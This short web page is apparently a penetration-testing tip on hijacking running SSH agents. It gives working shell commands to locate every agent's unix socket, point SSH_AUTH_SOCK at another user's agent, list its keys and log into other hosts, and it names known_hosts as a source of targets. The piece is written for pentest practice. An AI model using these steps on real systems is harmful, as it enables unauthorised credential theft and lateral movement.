<title>Hijacking SSH Agents</title>
</head><body>Hijacking SSH Agents<br/>
If you see SSH agents running on a pentest (process called “ssh-agent”), you might be able to use it to authenticate you to other hosts – or other accounts on that host. &nbsp;Check out ~/.ssh/known_hosts for some ideas of where you might be able to connect to.<br/>
<br/>
You can use any agents running under the account you compromised. &nbsp;If you’re root you can use any SSH agent.<br/>
<br/>
SSH agents listen on a unix socket. &nbsp;You need to figure where this is for each agent (e.g. /tmp/ssh-tqiEl28473/agent.28473). You can then use the agent like this:<br/>
<br/>
export &nbsp;SSH_AUTH_SOCK=/tmp/ssh-tqiEl28473/agent.28473<br/>
ssh-add -l # lists the keys loaded into the agent<br/>
ssh user@host # will authenticate you if server trusts key in agent<br/>
<br/>
This command illustrates how you could inspect the environment of every ssh-agent process on a Linux system. &nbsp;It should yield a list of unix sockets for SSH agents.<br/>
<br/>
ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK | sed 's/.*SSH_AUTH_SOCK=//' | cut -f 1 -d ' '</body></html>
